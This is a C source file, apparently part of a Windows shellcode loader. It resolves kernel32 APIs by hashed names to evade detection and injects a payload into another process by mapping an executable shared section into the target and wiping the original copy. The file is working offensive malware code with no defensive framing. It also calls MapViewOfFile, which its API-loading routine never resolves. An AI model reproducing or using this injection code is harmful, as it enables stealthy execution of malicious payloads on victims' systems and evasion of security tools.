#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"








BOOL memory_load_apis() {
	g_ldr->apis->OpenProcess = (pOpenProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_OPENPROCESS);
	g_ldr->apis->CreateFileMappingA = (pCreateFileMappingA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATESECTION);
	g_ldr->apis->MapViewOfFile2 = (pMapViewOfFile2)GetProc(g_ldr->apis->modules.kernel32, HASHED_MAPVIEWOFFILE2);
	g_ldr->apis->UnmapViewOfFile = (pUnmapViewOfFile)GetProc(g_ldr->apis->modules.kernel32, HASHED_UNMAPVIEWOFFILE);
	g_ldr->apis->CloseHandle = (pCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);

	return g_ldr->apis->OpenProcess && g_ldr->apis->CreateFileMappingA && g_ldr->apis->MapViewOfFile2 && g_ldr->apis->UnmapViewOfFile;
}


MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
	MemoryInfo memInfo = { 0 };

	DWORD pid;
	HANDLE hProc = resolve_target_process(&pid);
	HANDLE hFile = g_ldr->apis->CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, PayloadSize, NULL);
	if (hFile == NULL) {
		DBGA("[!] Failed Creating Section | %lu\n", GetLastError());
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}

	PVOID local = g_ldr->apis->MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, PayloadSize);
	if (local == NULL) {
		DBGA("[!] Failed Mapping Section Locally | %lu\n", GetLastError());
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}

	DBGA("[*] Local Mapped Address 0x%p\n", local);

	memcpy(local, PayloadAddress, PayloadSize);
	clear_payload(PayloadAddress, PayloadSize);
	
	PVOID remote = g_ldr->apis->MapViewOfFile2(hFile, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
	if (remote == NULL) {
		DBGA("[!] Failed Mapping Section Remotely | %lu\n", GetLastError());
		g_ldr->apis->UnmapViewOfFile(local);
		g_ldr->apis->CloseHandle(hFile);
		memInfo.ok = FALSE;
		return memInfo;
	}
	DBGA("[*] Remote Mapped Address 0x%p in PID %lu\n", remote, pid);

	g_ldr->apis->UnmapViewOfFile(local);
	g_ldr->apis->CloseHandle(hFile);

	memInfo.ShellCodeAddress = remote;
	memInfo.BytesWrote = PayloadSize;
	memInfo.remotePid = pid;
	memInfo.remoteProcess = hProc;
	memInfo.ok = TRUE;




	return memInfo;

}


